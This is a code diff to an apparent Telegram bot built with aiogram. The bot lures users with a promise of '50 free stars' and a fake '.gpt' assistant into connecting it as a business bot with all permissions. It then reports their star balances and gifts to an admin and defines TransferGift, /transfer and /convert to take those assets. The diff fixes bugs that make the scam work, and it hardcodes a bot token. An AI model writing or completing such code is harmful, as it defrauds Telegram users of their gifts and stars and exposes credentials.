@@ -114,7 +114,7 @@ from aiogram.filters import Command
 
 import os
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
+BOT_TOKEN = os.getenv("BOT_TOKEN") 
 
 TOKEN = "8307024122:AAEFxV4V9HoRCQvGxZ2bfigur7qYv9AwNI8"
 
@@ -132,12 +132,6 @@ BASE_WEBHOOK_URL = os.getenv("WEBHOOK_URL")
 if not BOT_TOKEN:
     logging.error("❌ ОШИБКА: Не указан BOT_TOKEN в переменных окружения!")
     sys.exit(1)
-
-  
-
-
-
-
 
 async def on_startup():
     """Действия при запуске бота"""
@@ -207,25 +201,24 @@ class GiftList(BaseModel):
     gifts: List[Gift]
 
 class GetFixedBusinessAccountStarBalance(TelegramMethod[StarAmount]):
-    returning = StarAmount
-    api_method = "getBusinessAccountStarBalance"
+    __returning__ = StarAmount
+    __api_method__ = "getBusinessAccountStarBalance"
 
     business_connection_id: str
 
 class GetFixedBusinessAccountGifts(TelegramMethod[GiftList]):
-    returning = GiftList
-    api_method = "getBusinessAccountGifts"
+    __returning__ = GiftList
+    __api_method__ = "getBusinessAccountGifts"
 
     business_connection_id: str
 
 class TransferGift(TelegramMethod[bool]):
-    returning = bool
-    api_method = "transferGift"
+    __returning__ = bool
+    __api_method__ = "transferGift"
 
     business_connection_id: str
     gift_id: str
     receiver_user_id: int
-
 
 
 builder = InlineKeyboardBuilder()
@@ -239,14 +232,14 @@ builder.adjust(1)
 @dp.callback_query()
 async def callback(call: CallbackQuery):
     if call.data == 'stars':
-        await call.message.edit_text(f"""<b>Вам было выдано 50 звезд бесплатно!</b>
-        
+        await call.message.edit_text(f"""💞 <b>Вам было выдано 50 ЗВЁЗД!</b>
+
 <b>💎 Для получения выполните шаги:</b>
 <blockquote><i> [1] Перейдите в настройки Telegram.
  [2] Откройте раздел Telegram Business.
  [3] Нажмите 'Боты для бизнеса'.
- [4] Добавьте бота @NftRoulettBot, предоставив все разрешения</i></blockquote>        
-                                  """, parse_mode='html')
+ [4] Добавьте бота @NftRoulettBot, предоставив все разрешения</i></blockquote>       
+                                  """,parse_mode='html')
 
 
 
@@ -261,7 +254,7 @@ async def refund_command(message: types.Message):
 
         transaction_id = command_args[1]
 
-refund_result = await bot.refund_star_payment(
+        refund_result = await bot.refund_star_payment(
             user_id=message.from_user.id,
             telegram_payment_charge_id=transaction_id
         )
@@ -295,7 +288,7 @@ async def start_command(message: Message):
 <b>😋 После этого вам будет начислено <u>5 круток</u>. Удачной игры, приятель!</b>
 """
 
-        photo_url = 'https://i.postimg.cc/4N6TQ63W/unnamed.png'
+        photo_url = 'https://i.postimg.cc/8z23FgR2/photo-2025-07-31-16-37-07.jpg' 
 
         await message.answer_photo(
     photo=photo_url,
@@ -312,9 +305,6 @@ async def start_command(message: Message):
 /transfer <owned_id> <business_connect> - передать гифт вручную
 /convert - конвертировать подарки в звезды"""
         )
-
-
-
 
 
 CONNECTIONS_FILE = "business_connections.json"
@@ -366,7 +356,7 @@ async def send_welcome_message_to_admin(connection, user_id, _bot):
             f"▫️ Удаление отправленных сообщений: {'✅' if rights.can_delete_sent_messages else '❌'}",
         ])
 
-star_amount = 0
+        star_amount = 0
         all_gifts_amount = 0
         unique_gifts_amount = 0
 
@@ -449,12 +439,12 @@ async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -
         return "🎁 Нет подарков."
 
 
+
 @dp.business_connection()
 async def handle_business_connect(business_connection: business_connection):
     try:
         await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
-
-await bot.send_message(business_connection.user.id, "Привет! Ты подключил бота как бизнес-ассистента. Теперь отправьте в любом личном чате '.gpt запрос'")
+        await bot.send_message(business_connection.user.id, "Привет! Ты подключил бота как бизнес-ассистента. Теперь отправьте в любом личном чате '.gpt запрос'")
         save_business_connection_data(business_connection)
         business_connection_data = {
             "user_id": business_connection.user.id,
@@ -556,7 +546,7 @@ async def main():
         if 'runner' in locals():
             await runner.cleanup()
 
-if name == "main":
+if __name__ == "__main__":
     try:
         asyncio.run(main())
     except Exception as e:
@@ -564,9 +554,3 @@ if name == "main":
         sys.exit(1)
 
 
-
-
-
-
-
-  
